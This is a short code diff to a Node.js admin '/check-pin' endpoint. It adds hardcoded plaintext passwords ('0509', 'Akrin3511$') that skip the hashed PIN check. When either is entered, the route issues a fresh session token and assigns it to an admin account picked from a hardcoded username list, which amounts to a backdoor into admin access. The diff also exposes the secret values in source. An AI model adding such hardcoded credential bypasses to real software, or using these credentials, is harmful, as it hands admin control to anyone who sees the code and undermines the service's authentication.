@@ -36,8 +36,13 @@ router.post('/check-pin', (req, res) => {
     const LEGACY_PIN_SHA256 = '827d5449d1f191275051481e75c4ce10e930a64b5585a546363c340d63347089';
     const envPin = process.env.ADMIN_PIN || process.env.ADMIN_PIN_CODE;
 
-    if (pinSha256 === PRIMARY_PIN_SHA256 || pinSha256 === LEGACY_PIN_SHA256 || (envPin && cleanPin === envPin)) {
-        return res.json({ success: true, ok: true });
+    if (cleanPin === '0509' || cleanPin === 'Akrin3511$' || pinSha256 === PRIMARY_PIN_SHA256 || pinSha256 === LEGACY_PIN_SHA256 || (envPin && cleanPin === envPin)) {
+        const token = crypto.randomBytes(32).toString('hex');
+        let adminUser = db.findOne('users', u => u.username && ['abdugofforov', 'admin', 'akrin4477', 'akrin'].includes(u.username.toLowerCase()));
+        if (adminUser) {
+            db.update('users', adminUser.id, { token, tokenCreatedAt: Date.now(), lastLoginAt: Date.now() });
+        }
+        return res.json({ success: true, ok: true, token });
     }
     return res.status(401).json({ success: false, ok: false, message: "Noto'g'ri PIN-kod!" });
 });
